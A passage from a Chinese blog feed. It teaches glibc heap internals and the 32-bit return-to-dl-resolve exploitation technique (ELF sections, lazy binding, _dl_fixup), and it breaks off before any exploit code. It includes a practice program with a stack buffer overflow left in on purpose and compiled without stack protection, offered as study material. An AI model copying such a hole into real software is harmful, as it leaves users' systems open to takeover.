+<p>当主线程和线程1，2首次调用malloc时都是直接分配arena空间，并且每一个线程都与各自的arena一一对应。但是当线程3调用malloc时，可以分配的arena数量已经到达上限了，这时会去通过重复利用已经存在的arena：<br>    1. 首先会去遍历一遍所有的，并尝试给每个arena加锁（表示这个arena是占用状态）<br>    2. 如果成功加锁则将这个arena返回给用户使用。<br>    3. 如果失败线程3会被阻塞直至有可用的arena<br>当线程3第二次调用时，malloc会尝试使用上次成功使用的arena，如果失败则阻塞至可用为止。</p>
+<h1 id="堆的数据结构"><a href="#堆的数据结构" class="headerlink" title="堆的数据结构"></a>堆的数据结构</h1><p>glibc中关于heap主要有三个结构需要关注：</p>
+<h2 id="heap-info-heap-header"><a href="#heap-info-heap-header" class="headerlink" title="heap_info(heap header)"></a>heap_info(heap header)</h2><p>因为thread arena 可以包含多个heap，并且通常情况这些堆空间都不是连续的，所以为了区分多个不同的heap，所有通过mmap处申请的空间都会包含这个结构。而main arena 是通过sbrk()扩展的堆空间所以没有heap_info的数据结构。</p>
+<p>heap_info</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">typedef struct _heap_info</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  mstate ar_ptr; &#x2F;* Arena for this heap. *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  struct _heap_info *prev; &#x2F;* Previous heap. *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  size_t size;   &#x2F;* Current size in bytes. *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  size_t mprotect_size; &#x2F;* Size in bytes that has been mprotected</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">                           PROT_READ|PROT_WRITE.  *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Make sure the following data is properly aligned, particularly</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     MALLOC_ALIGNMENT. *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#125; heap_info;</span></pre></td></tr></table></figure>
+
+<h2 id="malloc-state-arena-header"><a href="#malloc-state-arena-header" class="headerlink" title="malloc_state(arena header)"></a>malloc_state(arena header)</h2><p>这个结构用于记录arena的状态，如：各个bins，top chunk以及last remainder chunk等信息。<br>注意，main arena的malloc_state并不是sbrk申请的空间的一部分，他存储在libc.so中的数据段中，是一个全局变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">struct malloc_state</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Serialize access.  *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  mutex_t mutex;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Flags (formerly in max_fast).  *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  int flags;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Fastbins *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Base of the topmost chunk -- not otherwise kept in a bin *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  mchunkptr top;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* The remainder from the most recent split of a small request *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  mchunkptr last_remainder;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Normal bins packed as described above *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Bitmap of bins *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  unsigned int binmap[BINMAPSIZE];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Linked list *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  struct malloc_state *next;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Linked list for free arenas.  *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  struct malloc_state *next_free;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Memory allocated from the system in this arena.  *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">  INTERNAL_SIZE_T system_mem;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">  INTERNAL_SIZE_T max_system_mem;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr></table></figure>
+
+<h2 id="malloc-chunk-chunk-header"><a href="#malloc-chunk-chunk-header" class="headerlink" title="malloc_chunk(chunk header)"></a>malloc_chunk(chunk header)</h2><p>一个heap是通过分成多个chunk块来使用的，chunk是堆空间的最小单位。每个chunk的大小根据申请来决定的，这个结构用来记录当前chunk的使用情况它存在于每个chunk的头部，并且和之后的堆溢出有相当重要的联系，需要重点注意。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* #define INTERNAL_SIZE_T size_t *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  INTERNAL_SIZE_T      prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  INTERNAL_SIZE_T      size;       &#x2F;* Size in bytes, including overhead. *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. 这两个指针只在free chunk中存在*&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  struct malloc_chunk* bk;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  struct malloc_chunk* bk_nextsize;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr></table></figure>
+
+<h2 id="main-arena和thread-arena的内存分布图："><a href="#main-arena和thread-arena的内存分布图：" class="headerlink" title="main_arena和thread arena的内存分布图："></a>main_arena和thread arena的内存分布图：</h2><figure class="image-box">
+                <img src="/img/posts-img/linux_heap-3.png" alt="图3" title="" class="">
+                <p>图3</p>
+            </figure>
+<p>由图可以看出无论是在使用的块还是空闲块都有malloc_chunk结构，并且只有thread arena有heap info。</p>
+<h2 id="多个heap的thread-arena的内存分布图："><a href="#多个heap的thread-arena的内存分布图：" class="headerlink" title="多个heap的thread arena的内存分布图："></a>多个heap的thread arena的内存分布图：</h2><figure class="image-box">
+                <img src="/img/posts-img/linux_heap-4.png" alt="图4" title="" class="">
+                <p>图4</p>
+            </figure>
+<p>当thread arena 有多个heap时它们是通过heap_info的指针形成了一个单向链表，并且top chunk永远是在新申请的那个heap中。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>1.<a href="https://segmentfault.com/a/1190000005118060" rel="noopener">https://segmentfault.com/a/1190000005118060</a><br>2.<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a><br>3.<a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" rel="noopener">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a><br>4.<a href="https://www.jianshu.com/p/cd7f63fca008" rel="noopener">https://www.jianshu.com/p/cd7f63fca008</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn学习 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> heap-overflow </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[return-to-dl-resolve(32)]]></title>
+      <url>/2020/03/15/return-to-dl-resolve(32)/</url>
+      <content type="html"><![CDATA[<p>这里主要参考<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" rel="noopener">BruceFan’s Blog</a><br>测试程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">256</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">"test-for-ret2-dl-resolve\n"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    vuln();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+<p>编译：gcc -o filename -m32 -fno-stack-protector filename.c</p>
+<h1 id="相关知识："><a href="#相关知识：" class="headerlink" title="相关知识："></a>相关知识：</h1><p>由于32位程序和64位程序的rop链的构造会有许多不同之后会专门写一篇介绍，但是相关知识部分重叠较多不少地方只是占用字节的变化，这里就不专门提及64位的情况了。</p>
+<h2 id="elf文件结构"><a href="#elf文件结构" class="headerlink" title="elf文件结构"></a>elf文件结构</h2><p>ELF （Executable and Linkable Format）文件，也就是在 Linux 中的目标文件，主要有以下三种类型：</p>
+<ul>
+<li><p>可重定位的对象文件(Relocatable file)<br>  这是由汇编器汇编生成的 .o 文件。使用链接器(link editor)拿一个或一些 Relocatable object files 作为输入，经链接处理后，生成一个可执行的对象文件 (Executable file) 或者一个可被共享的对象文件(Shared object file)。我们可以使用 ar 工具将众多的 .o 文件（Relocatable object files）归档(archive)成 .a 静态库文件。</p>
+</li>
+<li><p>可执行的对象文件(Executable file)<br>  就是我们通常在 Linux 中执行的程序。但是注意另外一种可执行的脚本(如shell脚本)不是 Executable object file，它们只是文本文件，但是执行这些脚本所用的解释器就是 Executable object file。<a href="https://blog.csdn.net/qq_37375427/article/details/84947071" rel="noopener">前两个文件的区别</a></p>
+</li>
+<li><p>可被共享的对象文件(Shared object file)<br>  这些就是所谓的动态库文件，也即 .so 文件。如果拿静态库来生成可执行程序，那每个生成的可执行程序中都会有一份库代码的拷贝（ctf中也会出现一些静态编译的题目，这些题目通常比较好获取gadget）。如果将静态库换成动态库，就不会有这些拷贝。动态库在发挥作用的过程中，必须经过两个步：</p>
+<ul>
+<li>a) 链接编辑器(link editor)拿它和其他Relocatable object file以及其他shared object file作为输入，经链接处理后，生存另外的 shared object file 或者 executable file。 </li>
+<li>b) 在运行时，动态链接器(dynamic linker)拿它和一个Executable file以及另外一些 Shared object file 来一起处理，在Linux系统里面创建一个进程映像。</li>
+</ul>
+</li>
+</ul>
+<p>elf文件既会参与程序链接又会参与程序执行。出于方便性和效率考虑，根据过程的不同，elf文件格式提供了其内容的两种并行视图（一般情况下：链接视图——可重定位目标文件，执行视图——可执行目标文件），如下：</p>
+<figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-1.png" alt="图1" title="" class="">
+                <p>图1</p>
+            </figure>
+<p>这里我们只讨论和ret2dl-resolve相关的结构，如果该可执行文件参与动态链接，那么程序头部表（program header table）中会出现PT_DYNAMIC类型和该段的描述，该段中包含一个.dynamic节，该节的结构如下：（<a href="https://www.cnblogs.com/qscfyuk/p/11697816.html" rel="noopener">关于段和节的关系这里有一篇写的十分详细</a>)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    Elf32_Sword d_tag;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">union</span> &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        Elf32_Word d_val;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        Elf32_Addr d_ptr;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    &#125; d_un;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#125; Elf32_Dyn;</span></pre></td></tr></table></figure>
+<p>其中d_un的类型和取值与d_tag有关，简单来说相当于一个键值对（<a href="https://wiki.x10sec.org/executable/elf/elf_structure/#dynamic" rel="noopener">d_tag表</a>），这一节存储都是和链接相关的数据。</p>
+<p>接下来介绍节头表（section header table），节头表存储的是每一节的信息，它和程序头表类似都是以数组的形式存储，但是需要注意的是程序头表存储的是段的信息。并且：</p>
+<ul>
+<li>可执行文件一定有程序头表，但是不一定有节头表，因为可执行文件只需要进行执行操作，而执行时用到的是程序头表。</li>
+<li>可重定位文件一定有节头表，但是不一定有程序头表，因为可重定位文件只需要进行链接操作，而链接时用到的是节头表。</li>
+</ul>
+<p>节头表的数据结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_name; <span class="comment">//节名称</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_type; <span class="comment">//节类型</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_flags;<span class="comment">//读写执行的标志位</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    ELF32_Addr      sh_addr; <span class="comment">//在内存映象中的地址，通常为0</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    ELF32_Off       sh_offset; <span class="comment">//改节在文件中的偏移地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_size; <span class="comment">//节区大小</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_link; <span class="comment">//节区头部表索引链接与节类型有关</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_info; <span class="comment">//节表的附加信息</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_addralign; <span class="comment">//某些节区的地址需要对齐用于对其需要</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    ELF32_Word      sh_entsize; <span class="comment">//给出每个表项的字节大小，如符号表</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#125; Elf32_Shdr;</span></pre></td></tr></table></figure>
+<p>这里面有几个节需要关注：</p>
+<ol>
+<li>.rel.dyn与.rel.plt<br> .rel.dyn包含了动态链接的二进制文件中需要重定位的变量的信息，这些信息在加载的时候必须完全确定。而 .rel.plt 包含了需要重定位的函数的信息。这两类重定位节都使用如下的结构:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    Elf32_Addr r_offset;    <span class="comment">// 对于可执行文件，此值为虚拟地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    Elf32_Word r_info;      <span class="comment">// 符号表索引</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125; Elf32_Rel;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="class">&#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  Elf64_Addr   r_offset; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  Elf64_Xword  r_info;   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  Elf64_Sxword r_addend; <span class="comment">//常量补齐，用来计算将被填充到可重定位字段的数值</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#125;Elf64_Rela;</span></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<ol start="2">
+<li><p>.got与.got.plt<br> .got节存储全局变量的偏移。.got.plt，存储全局函数的偏移。并且可以通过.rel.dyn表中的r_offset数据段索引到相应的got.plt表的位置。</p>
+<figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-2.png" alt="图2" title="" class="">
+                <p>图2</p>
+            </figure>
+</li>
+<li><p>.dynsym<br> 这个节中包含了动态链接符号表，同样是以数组的方式存储，结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="class">&#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    Elf32_Word st_name;     <span class="comment">// Symbol name(string tbl index)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    Elf32_Addr st_value;    <span class="comment">// Symbol value</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    Elf32_Word st_size;     <span class="comment">// Symbol size</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">// Symbol type and binding</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// Symbol visibility under glibc&gt;=2.2</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    Elf32_Section st_shndx; <span class="comment">// Section index</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125; Elf32_Sym;</span></pre></td></tr></table></figure>
+<p> 它们可以通过.rel.dyn 与 .rel.plt的数据结构中的r_info来进行索引，注意在32位中r_info是四个字节，他的高三个字节用来存储索引值，后一个字节用来表示类型，而64位中r_info是八个字节，四个字节索引，四个字节表示类型。</p>
+</li>
+<li><p>.dynstr<br> 这个节包含了动态链接的字符串，Elf32_Sym中的st_name存储的就是字符串的偏移位置。</p>
+</li>
+<li><p>.plt<br> 这个节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。<br> 当程序调用外部函数时会首先跳转到这一节中。</p>
+</li>
+</ol>
+<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>程序在执行时，对于外部导入的函数并不会一开始就能够知道其在内存中的位置，ELF采用的延迟绑定的技术，只有在第一次执行这个函数时才会去计算这个函数的地址并将其写入got表中。</p>
+<figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-3.png" alt="图3" title="" class="">
+                <p>图3</p>
+            </figure>
+<p>如图所示，程序调用write函数时不是直接跳转到内存地址而是跳转到相应的plt表中，plt表中的的第一行指令是跳转到0x804a01c（这地址属于.got节）中存放的值所指向的地址。而程序在执行前是无法知道外部调用的函数位置，所以第一次引用时指向的是plt的下一行。接下来向栈内推入0x20并跳转到0x8048380（plt[0]）的位置。</p>
+<figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-4.png" alt="图4" title="" class="">
+                <p>图4</p>
+            </figure>
+<p>同样的这里执行的命令是将got[1]中的地址推入栈中，然后跳转到got[2]中存放的地址中去。需要注意的是这里got[1]存放的是link_map的地址，而got[2]存放的是_dl_runtime_resolve的函数地址。link_map是一个用于描述可加载共享目标文件的结构，由于结构过于复杂，这里就不过多介绍，不过但是要记住的是结构体中有一个字段l_info存放了.dynamic 节中对应的地址。并且是根据之前提到的d_tag对其进行索引。</p>
+<figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-5.png" alt="图5" title="" class="">
+                <p>图5</p>
+            </figure>
+<p>接下来进入_dl_runtime_resolve进行分析，这里会根据之前传入的参数0x20和link_map的地址找到write函数的正确地址并写入got表中，我们这里只关注关键函数 _dl_fixup 它通过寄存器传递参数。为了方便解释截取了部分源码。</p>
+<figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-6.png" alt="图6" title="" class="">
+                <p>图6</p>
+            </figure>
+<figure class="image-box">
+                <img src="/img/posts-img/dlresolve32-7.png" alt="图7" title="" class="">
+                <p>图7</p>
+            </figure>
+<p>这里的linkmap中l_info数组的索引指向的是向的就是d_tag为索引值的.dynamic的地址，并且根据d_ptr字段找到相应节的地址。reloc_offset和reloc_arg 被宏定义为相同的值。所以.rel.plt节的地址加上0x20就是存放write函数的全局偏移的位置。因此symtab和strtab、reloc 分别存放的是.dynsym、.dynstr、和.rel.plt中的write函数偏移的地址。<br>然后根据上一步计算出.rel.plt中存放write的位置，并根据Elf32_Rel的r_info字段计算出索引（方法在之前已给出，这个宏定义在32位下就是左移8位），然后根据.dynsym的基地值计算出存放write结构的位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//r_info地八位的检查</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//找到write函数在的.dynsym节中的位置后，</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算st_name字段的值加上.dynstr的地址找到相应的字符串，</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//然后传入_dl_lookup_symbol_x函数中找到glibc的基地址。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">                            version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过基地值计算出相关函数的实际地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                             + sym-&gt;st_value) : <span class="number">0</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//将value值写入got表中</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"><span 